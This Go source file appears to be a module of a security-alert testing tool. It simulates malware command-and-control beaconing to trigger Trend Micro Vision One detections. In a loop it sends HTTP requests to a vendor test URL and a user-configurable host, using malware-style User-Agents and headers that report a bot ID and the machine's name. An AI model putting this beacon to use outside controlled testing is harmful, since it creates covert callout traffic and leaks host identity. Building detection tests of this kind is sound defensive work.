//go:build windows

package main

// Module 5: C2 Beacon Simulation
// MITRE: T1071.001 (Application Layer Protocol - Web), T1571 (Non-Standard Port)
// Triggers: Vision One Network Correlation (C2/malicious URL detection)
//
// Rotates through three C2 targets per round:
//   1. https://wrs.test.trendmicro.com/EVIL  — Trend Micro WRS test URL (guaranteed alert)
//   2. https://wrs49.winshipway.com           — known test host
//   3. http://<user-supplied>                 — configurable
//
// Uses malware-realistic User-Agent strings and custom beacon headers.

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"
)

// Malware-realistic User-Agent strings (rotated per request)
var beaconUserAgents = []string{
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"WinHTTP/1.1",
	"Microsoft-Symbol-Server/6.3.9600.17095",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",
}

func startBeacon(interval time.Duration) {
	logf("MODULE 5: C2 Beacon")
	logf("  Targets  : %v", c2Targets)
	logf("  Interval : %v per round", interval)
	logf("  Technique: T1071.001 — periodic HTTP beacon with malware UA")

	// Unique bot identifier for this "infection"
	botID := fmt.Sprintf("%016x", rand.Uint64())
	host  := os.Getenv("COMPUTERNAME")

	client := &http.Client{
		Timeout: 10 * time.Second,
		// Don't follow redirects (mimics basic malware beacon behavior)
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	counter := 0
	for {
		for i, target := range c2Targets {
			ua := beaconUserAgents[(counter+i)%len(beaconUserAgents)]

			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				logf("  [BEACON] #%d → %s [req error: %v]", counter, target, err)
				continue
			}

			req.Header.Set("User-Agent", ua)
			req.Header.Set("X-Bot-ID", botID)
			req.Header.Set("X-Victim-Host", host)
			req.Header.Set("X-Counter", fmt.Sprintf("%d", counter))
			req.Header.Set("Accept", "*/*")

			resp, err := client.Do(req)
			if err != nil {
				logf("  [BEACON] #%d → %s [no response]", counter, target)
			} else {
				logf("  [BEACON] #%d → %s [HTTP %d]", counter, target, resp.StatusCode)
				resp.Body.Close()
			}
		}

		counter++
		logf("  Expect: Vision One network alert for malicious URL beacon")
		time.Sleep(interval)
	}
}
